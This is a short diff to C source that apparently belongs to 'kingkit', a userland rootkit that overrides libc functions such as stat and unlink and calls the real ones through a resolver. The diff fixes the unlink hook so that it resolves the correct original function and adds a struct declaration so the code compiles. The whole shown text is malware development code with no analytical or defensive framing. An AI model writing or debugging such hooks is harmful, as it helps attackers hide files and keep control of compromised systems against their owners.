@@ -59,7 +59,7 @@ int lstat(const char *restrict, struct stat *);
 int lstat64(const char *restrict, struct stat64 *);
 int fstatat(int, const char *restrict, struct stat *restrict, int);
 int fstatat64(int, const char *restrict, struct stat64 *restrict, int);
-int statx(int, const char *restrict, int, unsigned int, struct statx *restrict);
+struct statx;/* otherwise compiler will complain */int statx(int, const char *restrict, int, unsigned int, struct statx *restrict);
 int remove(const char *);
 int unlink(const char *);
 int unlinkat(int, const char *, int);
@@ -590,7 +590,7 @@ int unlink(const char *pathname) {
     #if DEBUG
 	printf("[kingkit] unlink called with pathname: %s.\n", pathname);
     #endif
-    original_remove = syscall_address(original_remove, "remove");
+    original_unlink = syscall_address(original_unlink, "unlink");
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL) //catch errors like ENOENTre
         return (*original_unlink)(pathname);
